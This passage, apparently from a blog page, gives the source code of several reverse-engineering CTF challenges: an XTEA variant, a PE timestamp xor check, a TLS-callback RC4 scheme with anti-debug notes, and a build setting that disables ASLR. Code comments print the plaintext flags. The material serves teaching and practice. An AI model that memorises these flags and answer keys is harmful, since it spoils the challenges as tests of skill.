Check(flag);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/TestDll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/DataTpye.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdio&quot;</span></span><br><br><span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;Do_y0u_kn0w_d11!&quot;</span>;<br>dword delta = <span class="hljs-number">0x9e3779c8</span>;<br><span class="hljs-type">int8_t</span> ans[] = &#123;<span class="hljs-number">122</span>,<span class="hljs-number">21</span>,<span class="hljs-number">-11</span>,<span class="hljs-number">118</span>,<span class="hljs-number">-96</span>,<span class="hljs-number">65</span>,<span class="hljs-number">-30</span>,<span class="hljs-number">-72</span>,<span class="hljs-number">-98</span>,<span class="hljs-number">125</span>,<span class="hljs-number">5</span>,<span class="hljs-number">72</span>,<span class="hljs-number">-46</span>,<span class="hljs-number">30</span>,<span class="hljs-number">25</span>,<span class="hljs-number">-71</span>,<span class="hljs-number">30</span>,<span class="hljs-number">19</span>,<span class="hljs-number">-76</span>,<span class="hljs-number">-52</span>,<span class="hljs-number">47</span>,<span class="hljs-number">35</span>,<span class="hljs-number">-3</span>,<span class="hljs-number">-102</span>,<span class="hljs-number">43</span>,<span class="hljs-number">74</span>,<span class="hljs-number">-29</span>,<span class="hljs-number">117</span>,<span class="hljs-number">-72</span>,<span class="hljs-number">-44</span>,<span class="hljs-number">-99</span>,<span class="hljs-number">63</span>,<span class="hljs-number">67</span>,<span class="hljs-number">-46</span><br>        ,<span class="hljs-number">125</span>,<span class="hljs-number">41</span>,<span class="hljs-number">-18</span>,<span class="hljs-number">63</span>,<span class="hljs-number">-90</span>,<span class="hljs-number">60</span>,<span class="hljs-number">20</span>,<span class="hljs-number">-109</span>,<span class="hljs-number">43</span>,<span class="hljs-number">89</span>,<span class="hljs-number">73</span>,<span class="hljs-number">-80</span>,<span class="hljs-number">-90</span>,<span class="hljs-number">-81</span>,&#125;;<br><br>qword __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x+y;<br>&#125;<br>qword __stdcall <span class="hljs-title function_">Sub</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x-y;<br>&#125;<br>qword __stdcall <span class="hljs-title function_">Mul</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x*y;<br>&#125;<br><br>qword __stdcall <span class="hljs-title function_">Div</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x/y;<br>&#125;<br><br>qword __stdcall <span class="hljs-title function_">Xor</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x^y;<br>&#125;<br><br>qword __stdcall <span class="hljs-title function_">Or</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x|y;<br>&#125;<br><br>qword __stdcall <span class="hljs-title function_">And</span><span class="hljs-params">(qword x,qword y)</span>&#123;<br>    <span class="hljs-keyword">return</span> x&amp;y;<br>&#125;<br><br>qword __stdcall <span class="hljs-title function_">Not</span><span class="hljs-params">(qword x)</span>&#123;<br>    <span class="hljs-keyword">return</span> !x;<br>&#125;<br><br><span class="hljs-type">bool</span> __stdcall <span class="hljs-title function_">CheckFlag</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; *(flag+i); ++i) &#123;<br>        <span class="hljs-keyword">if</span>(*(flag+i) != ans[i])<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>---------------------------------------------------------------------------------------<br><span class="hljs-comment">//.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> EXTERN_LIBRARY_TESTDLL_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXTERN_LIBRARY_TESTDLL_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DataTpye.h&quot;</span></span><br>qword __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Sub</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Mul</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Div</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Xor</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Or</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">And</span><span class="hljs-params">(qword x,qword y)</span>;<br>qword __stdcall <span class="hljs-title function_">Not</span><span class="hljs-params">(qword x)</span>;<br><span class="hljs-type">bool</span> __stdcall <span class="hljs-title function_">CheckFlag</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//EXTERN_LIBRARY_TESTDLL_H</span></span><br>----------------------------------------------------------------------------------------<br><span class="hljs-comment">//.def</span><br>EXPORTS<br><br>Add     @<span class="hljs-number">1</span> NONAME<br>Sub     @<span class="hljs-number">2</span> NONAME<br>Mul     @<span class="hljs-number">3</span> NONAME<br>Div     @<span class="hljs-number">4</span> NONAME<br>Xor     @<span class="hljs-number">5</span> NONAME<br>Or      @<span class="hljs-number">6</span> NONAME<br>And     @<span class="hljs-number">7</span> NONAME<br>Not     @<span class="hljs-number">8</span> NONAME<br>key     @<span class="hljs-number">10</span> NONAME DATA<br>delta   @<span class="hljs-number">11</span> NONAME DATA<br>CheckFlag   @<span class="hljs-number">12</span> NONAME<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (MSVC)<br>    add_compile_options(/Gy)  # 允许 COMDAT 折叠<br>#    add_link_options(/OPT:REF)  # 删除未使用的函数<br>    #   关闭CRT<br><span class="hljs-meta">#    set(CMAKE_MSVC_RUNTIME_LIBRARY <span class="hljs-string">&quot;MultiThreadedDLL&quot;</span>)  # 设置运行时库为多线程 DLL（/MD）</span><br><br><span class="hljs-meta">#    set(CMAKE_CXX_FLAGS_DEBUG <span class="hljs-string">&quot;/MDd /Od /Zi&quot;</span>)  # 关闭优化，启用调试信息</span><br><span class="hljs-meta">#    set(CMAKE_CXX_FLAGS_RELEASE <span class="hljs-string">&quot;/MD /O2 /Ob2 /DNDEBUG&quot;</span>)  # 高级优化</span><br><span class="hljs-meta">#    set(CMAKE_CXX_FLAGS_RELWITHDEBINFO <span class="hljs-string">&quot;/MD /O2 /Zi&quot;</span>)  # 既优化又保留调试信息</span><br><span class="hljs-meta">#    set(CMAKE_CXX_FLAGS_MINSIZEREL <span class="hljs-string">&quot;/MD /O1&quot;</span>)  # 以最小尺寸优化</span><br>    # 关闭随机地址<br>    <span class="hljs-built_in">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; /DYNAMICBASE:NO&quot;</span>)<br>    <span class="hljs-built_in">set</span>(CMAKE_SHARED_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_SHARED_LINKER_FLAGS&#125; /DYNAMICBASE:NO&quot;</span>)<br>endif()<br></code></pre></td></tr></table></figure><h2 id="Tea-1"><a href="#Tea-1" class="headerlink" title="Tea_1"></a>Tea_1</h2><blockquote><p>XTea变种</p><p>考点</p><ul><li>XTea算法理解</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;HeaderFile/DataType.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/Tea.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdio&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstring&quot;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> 0xEA123BFD,0x2C1E8ED4,0xE636E8B9,0x2E007C2E,0xE23E7380,0x8771ED1E,0x6A18A637,0x1B5D352F,0x3FA20F46,0x3B2099BB,0x3EB6E547</span><br><span class="hljs-comment"> flag&#123;Un3we2tened_teA_i3_th1_bes7_tea__drlnk&#125;</span><br><span class="hljs-comment"> Sugar-free_tea!!</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Encrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779a9</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        sum += delta;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">CheckFlag</span><span class="hljs-params">(dword* flag,dword len, dword* Ans)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>        <span class="hljs-keyword">if</span>(flag[i]!= Ans[i])<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Tea</span><span class="hljs-params">(<span class="hljs-type">char</span>* key,<span class="hljs-type">char</span>* plaintext,dword* Ans)</span>&#123;<br><span class="hljs-comment">//    puts(&quot;Have a cup of unsweetened tea&quot;);</span><br><br>    dword plaintext_len = <span class="hljs-built_in">strlen</span>(plaintext);<br>    dword* flag = (dword*) plaintext;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; (plaintext_len/<span class="hljs-number">4</span>)<span class="hljs-number">-1</span>; ++i) &#123;<br>        Encrypt(&amp;flag[i],(dword*)key);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(CheckFlag(flag,(plaintext_len/<span class="hljs-number">4</span>),Ans))&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!]\tEnjoy this cup of tea\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><h2 id="TimeDateStamp-1"><a href="#TimeDateStamp-1" class="headerlink" title="TimeDateStamp_1"></a>TimeDateStamp_1</h2><blockquote><p>PE.TimeDateStamp(程序编译完成时间)</p><p>考点</p><ul><li>xor</li><li>TimeDateStamp的获取</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">TimeBoom</span><span class="hljs-params">(<span class="hljs-type">char</span>* Timeflag)</span>&#123;<br>    qword ImageBase;<br>    pDosMember dosMember;<br>    pNT_Header64 pNtHeader64;<br>    HMODULE hmodule;<br>    dword flag_len ;<br><br>    hmodule = GetModuleHandleA(nullptr);<br>    ImageBase = (qword) hmodule;<br>    dosMember = (pDosMember) ImageBase;<br>    pNtHeader64 = (pNT_Header64) (ImageBase + dosMember-&gt;e_lfanew);<br><span class="hljs-comment">//    printf(&quot;0x%X\n&quot;,pNtHeader64-&gt;PEHeader.TimeDateStamp);</span><br>    srand(pNtHeader64-&gt;PEHeader.TimeDateStamp);<br>    <span class="hljs-comment">//flag&#123;Y0u_r3_starting_t3_kno3_PE_br1&#125;</span><br><br>    flag_len = <span class="hljs-built_in">strlen</span>(Timeflag);<br><span class="hljs-comment">//    for (auto i = 0; i &lt; flag_len; ++i)&#123;</span><br><span class="hljs-comment">//        printf(&quot;0x%x,&quot;,(byte)(Timeflag[i] ^ rand()));</span><br><span class="hljs-comment">//    &#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; flag_len; ++i)&#123;<br>        <span class="hljs-keyword">if</span>((byte)(Timeflag[i] ^ rand())!= TimeAns[i])<span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!]\tYou&#x27;re starting to learn PE\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="TLS-1"><a href="#TLS-1" class="headerlink" title="TLS_1"></a>TLS_1</h2><blockquote><p>TLS</p><p>考点</p><ul><li>TLS执行流程</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/BaseHeader.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/INCLUDE:__tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// _WIN64</span></span><br><br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK1</span><span class="hljs-params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">&quot;.CRT$XLX&quot;</span>)</span><br><span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.CRT$XLX&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">//存储回调函数地址</span><br>PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, <span class="hljs-number">0</span> &#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br>BYTE BOX[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;HELLO_MY_BOMB&quot;</span>;<br>DWORD KeyLen;<br>DWORD SUM = <span class="hljs-number">0</span>;<br>DWORD Reason = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// char flag1[] = &quot;flag&#123;Ok_You_already_know_Thread_Local_Storage&#125;&quot;;</span><br>BYTE ans[] = &#123;<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>,<br>    <span class="hljs-number">0x29</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xe4</span>,<br>    <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x9c</span>,<span class="hljs-number">0</span><br>    &#125;;<br><span class="hljs-type">char</span> flag[MAX_PATH];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">KSA</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span> &amp;&amp; Reason == <span class="hljs-number">1</span>; i++) BOX[i] = i;<br>    KeyLen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + BOX[i] + key[i % KeyLen]) % <span class="hljs-number">256</span>;<br>        BYTE temp = BOX[i];<br>        BOX[i] = BOX[j];<br>        BOX[j] = temp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitBOX</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) BOX[i] = i;<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">41</span>];<br>    sha1(key, <span class="hljs-built_in">strlen</span>(key), buf);<br><br>    KeyLen = <span class="hljs-built_in">strlen</span>(key);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + BOX[i] + key[i % KeyLen]) % <span class="hljs-number">256</span>;<br>        BYTE temp = BOX[i];<br>        BOX[i] = BOX[j];<br>        BOX[j] = temp;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) BOX[i] ^= buf[i % <span class="hljs-built_in">strlen</span>(buf)];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Encrypt</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++) flag[i] ^= (BOX[i] ^ (rand() &amp; <span class="hljs-number">0xff</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Check</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> boo = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; ans[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((flag[i]&amp;<span class="hljs-number">0xff</span>) != ans[i]) &#123;<br>            boo = <span class="hljs-number">0</span>;<span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (boo) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not right&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK1</span><span class="hljs-params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>&#123;<br>    Reason = dwReason;<br>    SUM += dwReason;<br>    <span class="hljs-keyword">if</span> (dwReason != <span class="hljs-number">3</span>)KSA();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == <span class="hljs-number">3</span>) &#123;<br>        srand(SUM);<br>        InitBOX();<br>        Encrypt(flag);<br>        Check();<br>        TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>    HANDLE hThread = CreateThread(nullptr, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)KSA, nullptr, <span class="hljs-literal">NULL</span>, nullptr);<br>    WaitForSingleObject(hThread, INFINITE);<br>    CloseHandle(hThread);<br>    srand(<span class="hljs-number">520</span>);<br>    Encrypt(flag);<br>    Check();<br>    TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="TLS-2"><a href="#TLS-2" class="headerlink" title="TLS_2"></a>TLS_2</h2><blockquote><p>TLS</p><p>考点</p><ul><li>TLS执行流程</li><li>PEB反调试</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 